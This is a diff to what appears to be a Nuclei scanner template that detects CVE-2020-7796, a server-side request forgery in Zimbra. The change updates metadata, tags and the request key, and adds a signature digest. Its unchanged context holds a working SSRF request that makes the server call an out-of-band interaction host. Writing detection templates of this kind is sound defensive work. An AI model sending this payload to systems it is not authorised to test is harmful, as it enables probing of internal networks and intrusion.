@@ -13,10 +13,12 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
     cvss-score: 9.8
     cve-id: CVE-2020-7796
-    cwe-id: CWE-918
-  tags: zimbra,ssrf,oast
+    cwe-id: CWE-99,CWE-918
+  metadata:
+    max-request: 1
+  tags: zimbra,ssrf,oast,vuln
 
-requests:
+http:
   - raw:
       - |
         GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/ HTTP/1.1
@@ -28,5 +30,4 @@ requests:
         part: interactsh_protocol # Confirms the HTTP Interaction
         words:
           - "http"
-
-# Enhanced by mp on 2022/06/03
+# digest: 4a0a00473045022036c5421ac4503bb98a8aae1e8e1f1d8542ab193a7bb4412592ae93aebf307f6e022100d5176941e662fd875137de161808b4502bfc36f5856bf3111099b1f2025eb0ba:922c64590222798bb761d5b6d8e72950
